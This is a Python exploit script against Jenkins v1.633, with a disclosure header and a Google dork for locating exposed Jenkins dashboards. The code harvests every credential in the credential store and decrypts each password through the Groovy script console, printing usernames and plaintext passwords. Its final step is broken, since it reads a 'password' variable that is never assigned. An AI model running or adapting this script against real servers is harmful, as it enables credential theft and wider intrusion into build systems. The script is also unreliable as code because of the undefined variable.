# Disclosure Date: 10/14/2015
# Response Date: 10/14/2015
# Response: "Recommend this be rejected as a vulnerability."
# Full report including response: http://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html
# Vendor Homepage: https://jenkins-ci.org/
# Tested on: Jenkins v1.633
# Author = &#039;Th3R3p0&#039; | Justin Massey
# Google Dork: intitle:"Dashboard [Jenkins]" Credentials
 
import requests
import re
from BeautifulSoup import BeautifulSoup
import urllib
 
 
# Usage: Modify the URL below to match the target host and port
#   Must have trailing slash at end of URL
url=&#039;http://192.168.1.151:8080/&#039;
 
# makes request to gather all users with stored credentials
r= requests.get(url + &#039;credential-store/domain/_/&#039;)
soup = BeautifulSoup(r.text)
 
# loop to go through all hrefs and match the regex "credential" and add the urls to the users list
users = []
for link in soup.body.findAll(&#039;a&#039;, href=True):
    m = re.match("credential", link[&#039;href&#039;])
    if m:
        if link[&#039;href&#039;] not in users:
            users.append(link[&#039;href&#039;])
 
for users in users:
    r2 = requests.get(url + &#039;credential-store/domain/_/&#039;+users+&#039;/update&#039;)
    soup2 = BeautifulSoup(r2.text)
 
    # Finds the user and password value in html and stores in encPass variable
    user = soup2.body.findAll(attrs={"name" : "_.username"})[0][&#039;value&#039;]
    encPass = soup2.body.findAll(attrs={"name" : "_.password"})[0][&#039;value&#039;]
    # Encodes the password to www-form-urlencoded standards needed for the expected content type
    encPassEncoded = urllib.quote(encPass, safe=&#039;&#039;)
 
    # Script to run in groovy scripting engine to decrypt the password
    script = &#039;script=hudson.util.Secret.decrypt+%%27&#039; \
             &#039;%s&#039;\
             &#039;%%27&json=%%7B%%22script%%22%%3A+%%22hudson.util.Secret.decrypt+%%27&#039; \
             &#039;%s&#039; \
             &#039;%%27%%22%%2C+%%22%%22%%3A+%%22%%22%%7D&Submit=Run&#039; % (encPassEncoded, encPassEncoded)
 
    with requests.Session() as s:
        r3 = s.get(url+&#039;script&#039;)
        headers = {&#039;content-type&#039;: &#039;application/x-www-form-urlencoded&#039;}
        r3 = s.post(url+&#039;script&#039;,data=script, headers=headers)
    soup3 = BeautifulSoup(r3.text)
 
    # Extracts password from body
    password = re.sub(&#039;Result:&#039;, &#039;&#039;, password)
    print "User: %s | Password:%s" % (user, password)

